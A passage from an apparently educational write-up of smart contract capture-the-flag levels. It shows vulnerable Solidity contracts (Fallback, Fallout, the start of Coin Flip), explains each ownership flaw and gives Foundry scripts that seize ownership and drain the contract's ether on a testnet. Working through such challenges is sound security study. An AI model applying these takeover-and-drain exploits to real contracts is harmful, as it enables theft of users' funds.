</span><span>    contributions</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>contributions</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;</span><span> contributions</span><span class="token" style="color:#d4d4d4">[</span><span>owner</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getContribution</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> contributions</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> contributions</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span class="token" style="color:#6a9955">//red flag</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We need to become the owner of the contract and drain all the ether from it.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>To set the owner we need to pass the require check in <code>receive()</code>.</li>
<li>To pass the check we have to send some ether with the transaction.</li>
<li>So, initially we will send contributions and then send some ether to the contract to invoke the <code>receive()</code> method.</li>
<li>Now, we can call <code>withdraw()</code> function to drain the contract.</li>
</ol>
<p><strong>Level1Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level1.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level1Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Fallback </span><span class="token" style="color:#569CD6">public</span><span> level1 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Fallback</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span class="token" style="color:#6a9955">//pass the contract address deployed on the sepolia testnet</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        level1</span><span class="token" style="color:#d4d4d4">.</span><span>contribute</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">1</span><span> wei</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>level1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">1</span><span> wei</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;New owner:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level1</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;My address:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envAddress</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">//once we became the owner of the contract, we can now withdraw</span><span>
</span>
<span>        level1</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level1Solution.s.sol:Level1Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Fallout</h2>
<p><strong>Level2.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//objectives-- claim ownership of the contract</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Fallout</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">using</span><span> </span><span class="token" style="color:#4ec9b0">SafeMath</span><span> </span><span class="token" style="color:#569CD6">for</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">mapping</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> allocations</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">/* constructor */</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">Fal1out</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    allocations</span><span class="token" style="color:#d4d4d4">[</span><span>owner</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>	        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>	            msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>	            </span><span class="token" style="color:#ce9178">&quot;caller is not the owner&quot;</span><span>
</span><span>	        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>	        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>	    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">allocate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    allocations</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> allocations</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sendAllocation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> allocator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>allocations</span><span class="token" style="color:#d4d4d4">[</span><span>allocator</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    allocator</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>allocations</span><span class="token" style="color:#d4d4d4">[</span><span>allocator</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">collectAllocations</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">allocatorBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> allocator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> allocations</span><span class="token" style="color:#d4d4d4">[</span><span>allocator</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal</strong>: Claim the ownership of the contract</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>In Solidity 0.6.0, the constructor is the function with the same name as the contract.</li>
<li>But in the given challenge, the contract name (<code>Fallout</code>) and the function name(<code>Fal1out</code>) are not the same.</li>
<li>So, we can call this function directly.</li>
</ol>
<p><strong>Level2Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level2.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level2Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Fallout </span><span class="token" style="color:#569CD6">public</span><span> level2 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Fallout</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xaEb939E61726c0f9d0078c3FC1C1508ABa6C26C4</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Owner before&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level2</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        level2</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">Fal1out</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Owner after&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level2</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level2Solution.s.sol:Level2Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Coin Flip</h2>
<p><strong>Level3.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//objective:</span><span>
</span><span></span><span class="token" style="color:#6a9955">// win the game 10 times at a time</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">CoinFlip</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> consecutiveWins</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint256</span><span> lastHash</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint256</span><span> FACTOR </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    consecutiveWins </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">flip</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> _guess</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> blockValue </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">blockhash</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>number </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>lastHash </span><span class="token" style="color:#d4d4d4">==</span><span> blockValue</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">revert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
